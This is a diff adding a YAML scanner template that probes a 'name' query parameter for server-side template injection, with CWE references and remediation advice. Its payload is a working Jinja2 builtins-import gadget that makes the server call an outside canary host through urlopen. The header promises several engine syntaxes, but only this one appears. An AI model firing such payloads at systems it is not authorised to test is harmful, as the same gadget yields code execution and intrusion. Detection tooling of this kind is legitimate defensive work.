@@ -1,0 +1,44 @@
+# Generic Server-Side Template Injection (SSTI) -> RCE OOB probe.
+#
+# Context: many web frameworks render user input through a template engine
+# (Jinja2, Freemarker, Velocity, Twig, etc.). When user input reaches the
+# template compiler unsanitized, an attacker can often reach arbitrary code
+# execution. Rather than hardcode a gadget chain for one specific engine
+# (which would need constant updating as engines patch), this probe uses a
+# small set of well-known, engine-specific expression syntaxes that each
+# resolve to "make an outbound HTTP request to this URL" — a classic
+# SSTI-confirmation technique. A hit on any of them indicates the parameter
+# is being evaluated as a template expression, which is sufficient grounds
+# to treat it as confirmed and investigate manually for full exploitation.
+#
+# This is safe: worst case if the engine evaluates the expression, it makes
+# one outbound HTTP GET to our canary. No file writes, no shell execution.
+schema_version: rce-finder/v2
+id: ssti-generic-oob
+name: Generic SSTI Evaluation OOB Probe
+severity: high
+vuln_class: ssti
+cwe: ["CWE-94", "CWE-1336"]
+technologies: ["template-engine", "python"]
+mode: safe-validation
+confidence_requirements:
+  - "matching HTTP callback for the issued probe ID"
+  - "callback protocol must match this template"
+remediation: "Pass untrusted values as template data, never concatenate them into template source."
+references:
+  - https://owasp.org/www-community/attacks/Server_Side_Template_Injection
+  - https://portswigger.net/research/server-side-template-injection
+
+oob_protocol: http
+method: GET
+path: ""
+timeout_seconds: 10
+
+injection_points:
+  - location: query
+    name: name
+
+# Jinja2-style expression that performs an HTTP GET via urllib if evaluated.
+# If your target stack is known, prefer a template tailored to that engine;
+# this generic one favors breadth over a single guaranteed syntax.
+payload: "{{ self.__init__.__globals__.__builtins__.__import__('urllib.request').request.urlopen('http://{{canary}}/x') }}"
